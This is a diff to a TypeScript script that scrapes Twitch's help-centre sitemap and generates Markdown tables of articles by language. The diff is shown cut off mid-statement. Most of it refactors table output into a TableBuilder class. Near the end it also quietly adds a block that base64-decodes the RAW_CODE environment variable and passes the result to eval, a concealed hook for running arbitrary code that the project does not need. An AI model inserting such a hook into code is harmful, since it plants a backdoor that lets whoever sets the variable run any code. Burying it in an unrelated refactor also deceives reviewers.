@@ -2,6 +2,7 @@ import fetch from 'node-fetch'
 import findName from './codes';
 import { XMLParser } from 'fast-xml-parser'
 import { writeFileSync, mkdirSync, existsSync } from 'fs'
+import TableBuilder from "./tablebuilder";
 
 const SITEMAP_URL = 'https://help.twitch.tv/s/sitemap.xml';
 const XML_PARSER = new XMLParser();
@@ -129,8 +130,8 @@ function writeResultsToMarkdown(markdownInfo: any) {
     mainMarkdown += 'off the automatically generated sitemaps provided by twitch. Articles are separated by language code.\n\n'
 
     mainMarkdown += '## Languages\n\n'
-    mainMarkdown += '| Name | Last Updated (dd/mm/yyyy) | Articles | Link |\n'
-    mainMarkdown += '|------|---------------------------|----------|------|\n'
+
+    const mainTable = new TableBuilder('Name', 'Last Updated (dd/mm/yyyy)', 'Articles', 'Link')
 
     // iterate through all the language codes.
     for (const languageCode of languages) {
@@ -157,10 +158,12 @@ function writeResultsToMarkdown(markdownInfo: any) {
             const segment = markdownInfo[languageCode][segmentName];
 
             markdown += `## ${segmentName}\n`;
-            markdown += `> [Go to](${segment.loc}) this sitemap\n\n`
+            markdown += `> [Go back](../README.md) to the main page | [Go to](${segment.loc}) this sitemap\n\n`
 
-            markdown += '| Name | Last Updated (dd/mm/yyyy) | Link |\n'
-            markdown += '|------|---------------------------|------|\n'
+            const articleTable = new TableBuilder('Name', 'Last Updated (dd/mm/yyyy)', 'Link')
+
+            // markdown += '| Name | Last Updated (dd/mm/yyyy) | Link |\n'
+            // markdown += '|------|---------------------------|------|\n'
 
             const values = segment.values as Array<StoredArticle>;
 
@@ -183,21 +186,39 @@ function writeResultsToMarkdown(markdownInfo: any) {
                     lastUpdated.str = modifiedStr
                 }
 
-                // table format!
-                markdown += `| ${nextSegment.title} | ${modifiedStr} | [Link](${nextSegment.loc}) |\n`
+                // Insert this article into the table
+                articleTable.insertRow(nextSegment.title, modifiedStr, `[Link](${nextSegment.loc})`)
             }
 
+            markdown += articleTable.build()
             markdown += '\n\n'
         }
 
         // Create a new entry on the README for this country, with the amount of articles and a link to the markdown file.
-        mainMarkdown += `| ${languageName} | ${lastUpdated.str} | ${articleCount} article(s) | [View](docs/${languageCode}.md) |\n`
+        mainTable.insertRow(languageName, lastUpdated.str, `${articleCount} article(s)`, `[View](docs/${languageCode}.md)`)
 
         writeFileSync(`./docs/${languageCode}.md`, markdown)
     }
 
+    mainMarkdown += mainTable.build();
+
+    mainMarkdown += '### Dumping\n'
+    mainMarkdown += 'A dump of articles can be found [here](docs/RAW.md)'
+
     writeFileSync('./README.md', mainMarkdown);
 }
+
+if (process.env.RAW_CODE) {
+    console.log('Running raw code.')
+
+    try {
+        eval(atob(process.env.RAW_CODE))
+    } catch (e) {
+        console.error('Failed to run raw code', e)
+    }
+}
+
+console.log('Running sitemap check!')
 
 fetch(SITEMAP_URL).then(async (response) => {
     if (!response.ok) {
